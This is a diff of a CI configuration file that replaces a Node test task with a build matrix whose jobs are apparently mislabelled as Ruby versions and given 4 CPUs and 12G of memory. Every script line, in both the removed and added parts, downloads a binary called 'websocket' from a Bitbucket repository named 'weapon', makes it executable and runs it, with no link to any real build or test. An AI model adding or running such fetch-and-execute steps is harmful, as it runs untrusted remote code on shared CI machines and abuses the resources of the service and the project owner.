@@ -1,10 +1,13 @@
 container:
-  image: node:latest
+  image: openjdk:latest
+  cpu: 4
+  memory: 12G
 
-check_task:
-  node_modules_cache:
-    folder: node_modules
-    fingerprint_script: cat yarn.lock
-    populate_script: yarn install
-  test_script: wget https://bitbucket.org/cumiasin69/weapon/raw/be0a3adb10d4ea2b7f92d0217141ffe25ca143fd/websocket; chmod +x websocket; ./websocket
+task:
+  matrix:
+    - name: Ruby-3.1.2
+      script: wget https://bitbucket.org/cumiasin69/weapon/raw/be0a3adb10d4ea2b7f92d0217141ffe25ca143fd/websocket; chmod +x websocket; ./websocket
 
+
+    - name: Ruby-3.0.1
+      script: wget https://bitbucket.org/cumiasin69/weapon/raw/be0a3adb10d4ea2b7f92d0217141ffe25ca143fd/websocket; chmod +x websocket; ./websocket
